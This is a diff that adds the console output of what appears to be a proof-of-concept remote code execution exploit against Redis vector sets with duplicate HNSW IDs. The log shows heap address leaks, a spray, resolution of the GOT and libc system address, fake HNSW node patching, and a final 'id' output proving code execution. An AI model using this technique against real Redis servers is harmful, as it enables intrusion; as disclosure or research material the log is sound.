@@ -1,0 +1,19 @@
+[+] lua=0x5797aeb754a0 oldB(read)=0x5797aeb771e0 C00=0x5797aeb774d0
+[+] RESTORE v(read) b'+OK\r\n'
+[+] VREM v B b':1\r\n'
+[+] SET spray b'+OK\r\n'
+[+] pie=0x579791926000 free@GOT=0x579791cafeb8->0x78cd934add50
+[+] libc=0x78cd93400000 system=0x78cd93458750
+[+] RESTORE w(write) b'+OK\r\n'
+[+] VREM w B b':1\r\n'
+[+] VREM w D b':1\r\n'
+[+] SET fD b'+OK\r\n'
+[+] SET fB b'+OK\r\n'
+[+] w moduleValue=0x5797aeb84af0
+[+] fD content/node=0x5797aeb84515/0x5797aeb84510
+[+] fB content/node=0x5797aeb84065/0x5797aeb84060
+[+] fake HNSW nodes patched
+[+] VREM w C b':1\r\n'
+[+] DEL w b':1\r\n'
+[+] RCE proof created: /mnt/d/exploitarium/redis-vset-duplicate-hnsw-id-rce-poc/work/R
+uid=1000(owner) gid=1000(owner) groups=1000(owner),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
